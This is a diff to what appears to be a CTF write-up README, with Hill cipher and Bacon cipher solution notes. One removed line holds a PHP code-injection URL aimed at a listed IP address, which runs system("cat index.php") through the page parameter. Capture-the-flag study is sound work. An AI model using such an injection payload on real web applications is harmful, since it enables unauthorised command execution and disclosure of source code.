@@ -98,9 +98,7 @@ KLZCOUKTVOUWUKDOBGZVJIIIRGVHXCRQUCNOX_IBBL
 ```
 ![image](https://github.com/Chittu13/CTF/blob/main/image/hill_cipher.png)
   - flag ```CTF{BTW_EXISTS_AN_INTERESTING_FILM_ABOUT_HILLS}```
-2. http://62.173.140.174:46005/index.php?page=' and die(system("cat index.php")) or '
-    - if the web is old version use this in the url
-3. Replace small letters with A, capital letters with B
+2. Replace small letters with A, capital letters with B
     - ```BA BAAB AAABABAAAAABB AAA BBBBAA BBABAAA BA ABBABAAAB AABAAAA AB AAAAAA AABABB BBAABBABBAABA```
     - [bacon-cipher](https://www.dcode.fr/bacon-cipher)
 ## Forensics <a name="forensics"></a>
